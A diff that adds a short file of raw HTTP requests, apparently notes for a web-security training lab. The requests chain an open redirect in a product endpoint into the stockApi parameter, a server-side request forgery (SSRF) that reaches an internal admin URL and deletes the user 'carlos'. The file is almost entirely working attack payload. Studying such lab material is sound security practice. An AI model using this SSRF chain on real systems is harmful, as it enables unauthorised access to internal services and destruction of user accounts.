@@ -1,0 +1,13 @@
+GET /product/nextProduct?currentProductId=8&path=/product?productId=9 
+
+
+
+POST /product/stock
+
+
+stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D8%26storeId%3D1
+
+
+stockApi=/product/nextProduct?currentProductId=8&path=http://192.168.0.12:8080/admin/delete?username=carlos
+
+
